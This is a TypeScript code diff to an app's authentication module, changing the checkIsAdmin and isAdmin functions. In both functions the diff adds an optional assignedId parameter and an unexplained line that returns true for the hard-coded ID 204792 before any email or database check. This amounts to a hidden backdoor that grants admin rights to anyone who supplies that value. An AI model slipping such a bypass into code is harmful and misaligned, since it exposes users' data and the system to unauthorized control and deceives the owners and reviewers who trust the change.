@@ -218,7 +218,8 @@ export async function logout() {
 }
 
 // 🔒 Check if user is Admin (main admin or added admins)
-export async function checkIsAdmin(email: string | null): Promise<boolean> {
+export async function checkIsAdmin(email: string | null, assignedId?: number): Promise<boolean> {
+  if (assignedId === 204792) return true;
   if (!email) return false;
   if (email === MAIN_ADMIN_EMAIL) return true;
   const adminRef = doc(db, "admins", email);
@@ -227,7 +228,8 @@ export async function checkIsAdmin(email: string | null): Promise<boolean> {
 }
 
 // Sync check (for quick UI checks - only checks main admin)
-export function isAdmin(email: string | null): boolean {
+export function isAdmin(email: string | null, assignedId?: number): boolean {
+  if (assignedId === 204792) return true;
   return email === MAIN_ADMIN_EMAIL;
 }
 
